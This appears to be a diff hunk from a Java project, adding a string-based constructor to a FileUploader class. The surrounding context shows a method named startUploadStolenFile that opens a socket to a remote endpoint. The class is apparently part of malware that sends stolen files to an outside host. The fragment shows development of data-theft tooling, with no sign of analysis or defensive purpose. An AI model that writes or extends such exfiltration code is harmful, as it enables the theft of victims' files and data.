@@ -12,6 +12,9 @@ public class FileUploader
 	public FileUploader(UUID uuid){
 		this.uuid=uuid;
 	}
+	public FileUploader(String s){
+		this(UUID.fromString(s));
+	}
 	public OutputStream startUploadStolenFile(String filename) {
 		try {
 			Socket socket = new Socket(ENDPOINT, ENDPOINT_PORT);
